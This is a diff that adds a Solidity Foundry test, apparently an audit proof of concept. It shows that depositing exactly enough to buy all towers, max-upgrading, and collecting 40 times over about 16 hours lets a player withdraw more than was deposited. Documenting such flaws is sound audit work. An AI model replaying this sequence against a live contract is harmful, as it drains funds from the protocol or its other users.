@@ -119,6 +119,28 @@ contract SomeTest is Test {
         }
     }
 
+    function test_POC_DepositIsWorthMoreJustAfter16Hours() public {
+        _skip(101);
+        deal(user2, 1 ether);
+        _changePrank(user2);
+        _addGameEthAndAssert(user2, 1 ether);
+
+        uint256 depositValue_ = 7865 * gamePrice; // 7865 is the game eth needed to buy all towers
+        assertEq(depositValue_, 0.007865 ether);
+        deal(user1, depositValue_);
+        _changePrank(user1);
+        _addGameEthAndAssert(user1, depositValue_);
+        _maxUpgradeAndAssert(user1);
+
+        for (uint i = 0; i < 40; i++) {
+            _skip(24 minutes);
+            _collectAndAssert(user1);            
+        }
+        uint256 withdrawnValue_ = _withdrawAndAssert(user1);
+        assertEq(withdrawnValue_, 0.0081019008 ether);
+        assertGt(withdrawnValue_, depositValue_);
+    }
+
     function _changePrank(address user_) internal {
         vm.stopPrank();
         vm.startPrank(user_);
